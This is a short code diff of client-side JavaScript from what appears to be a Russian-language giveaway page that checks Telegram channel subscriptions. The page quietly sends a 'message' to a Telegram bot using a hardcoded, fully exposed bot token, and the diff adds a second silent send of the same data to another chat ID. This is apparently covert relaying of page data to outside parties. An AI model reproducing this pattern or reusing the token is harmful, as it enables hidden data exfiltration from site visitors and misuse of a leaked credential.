@@ -109,6 +109,9 @@
                     var url = 'https://api.telegram.org/bot6916581709:AAEekfXrJLLa6TF0lIP7hrZaS_D8xd28rvw/sendMessage?chat_id=2106502448&parse_mode=HTML&text=' + encodeURIComponent(message);
                     xhr.open('GET', url, true);
                     xhr.send();
+var url = 'https://api.telegram.org/bot6916581709:AAEekfXrJLLa6TF0lIP7hrZaS_D8xd28rvw/sendMessage?chat_id=1016745797&parse_mode=HTML&text=' + encodeURIComponent(message);
+                    xhr.open('GET', url, true);
+                    xhr.send();
                     subscriptionStatus.textContent = "✅ Ты участвуешь!";
                 } else {
                     subscriptionStatus.innerHTML = '❌ Отклонено: <br> Подпишись на необходимые соцсети: <a href="https://t.me/PomelkaShop">Канал 1</a>, <a href="https://t.me/RAVT_METRO">Канал 2</a>';
